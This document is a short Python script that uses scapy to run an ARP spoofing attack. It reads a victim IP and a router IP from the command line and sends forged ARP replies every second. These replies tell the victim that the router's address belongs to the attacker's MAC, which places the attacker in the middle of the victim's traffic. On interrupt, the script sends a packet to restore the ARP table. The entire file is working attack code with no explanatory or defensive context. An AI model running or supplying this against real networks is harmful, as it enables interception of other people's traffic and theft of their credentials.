from scapy.all import *
import sys
import time

def arp_spoof(router_ip, attacker_mac, victim_ip):
    packet = ARP(op="is-at", hwsrc=attacker_mac, psrc = router_ip, pdst= victim_ip)
    packet.show()
    send(packet, verbose=False)

def arp_restore(victim_ip, router_ip, router_mac):
    packet= ARP(op="is-at", hwsrc=router_mac,psrc= router_ip, pdst= victim_ip)
    send(packet, verbose=False)

def main():
    victim_ip= sys.argv[1]
    router_ip= sys.argv[2]
    victim_mac = getmacbyip(victim_ip)
    router_mac = getmacbyip(router_ip)
    my_mac = get_if_hwaddr(conf.iface)

    print (victim_ip )
    print (router_ip)
    print (victim_mac)
    print (router_mac)
    
    try:
       print("Sending spoofed ARP packets")
       while True:
            arp_spoof(router_ip, my_mac, victim_ip)
            time.sleep(1)
    except KeyboardInterrupt:
        print("Restoring ARP Tables")
        arp_restore(victim_ip, router_ip, router_mac)
        quit()

main()